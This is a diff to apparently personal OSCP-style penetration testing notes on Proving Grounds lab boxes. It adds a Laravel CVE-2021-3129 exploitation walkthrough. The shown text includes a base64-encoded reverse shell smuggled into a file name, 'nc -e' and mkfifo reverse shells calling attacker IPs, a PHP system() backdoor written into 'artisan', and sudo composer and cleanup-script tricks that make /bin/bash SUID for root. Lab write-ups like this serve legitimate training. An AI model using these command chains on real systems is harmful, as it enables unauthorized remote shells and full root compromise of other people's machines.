@@ -2747,7 +2747,7 @@ cp en.png '|en"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0OC84MDgwIDA+JjE
 # file name like '|en"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0OC84MDgwIDA+JjE= | base64 -d | bash`".png'
 ```
 
-###  /bin/bash -p
+###  Root access to the script user script and HtmLawed
 - I saw that some scripts has the root privileges to the scripts we can get root 2 way shown below
 - HtmLawed code execution with hook set to exec, Reference LAW-PGPractice Offsec
 ```bash
@@ -2765,6 +2765,34 @@ echo 'chmod u+s /bin/bash' >> cleanup.sh
 ls -alh /bin/bash
 #-rwsr-xr-x 1 root root 1.2M Mar 27  2022 /bin/bash
 /bin/bash -p # Got root shell
+```
+
+###  Lavarel exploit and sudo -l with composer.json then root 
+- In one of the box, had Lavarel 8.4.0 page, after directory brute forcing the found the register then Enable the APP_DEBUG
+- Privilege change to user using script, the sudo -l permission with composer added script that give the shell [Exploit](https://github.com/joshuavanderpoll/CVE-2021-3129)
+- Refernece is Lavita - PGPratice offsec [Article](https://medium.com/@ardian.danny/oscp-practice-series-61-proving-grounds-lavita-05d148d4fbfc)
+```bash
+python3 CVE-2021-3129.py --host="http://192.168.198.38/" --chain laravel/rce2 # Initially without chain
+# [?] Please enter a command to execute :
+execute nc 192.168.45.171 80 -e /bin/bash # Type below command
+rlwrap nc -nlvp 80 # www-data user linpeas.sh has file
+mv artisan artisan.bak
+echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.171 1223 >/tmp/f"); ?>' > artisan
+cat artisan # same above script
+rlwrap nc -nlvp 1223
+# id uid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)
+sudo -l
+# (root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita *
+# -rwxr-xr-x  1 www-data www-data    1645 Sep 14  2023 composer.json
+# with user www-data changes this commands
+mv composer.json composer.json.original
+echo '{"scripts":{"x":"chmod +s /bin/bash"}}' > composer.json
+cat composer.json
+sudo -u root /usr/bin/composer --working-dir\=/var/www/html/lavita run-script x
+#Prompt  Continue as root/super user [yes]? yes
+ls -la /bin/bash # check it has suid bit set or not-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+bash -p
+id # root
 ```
 ---
 # Post Exploitation
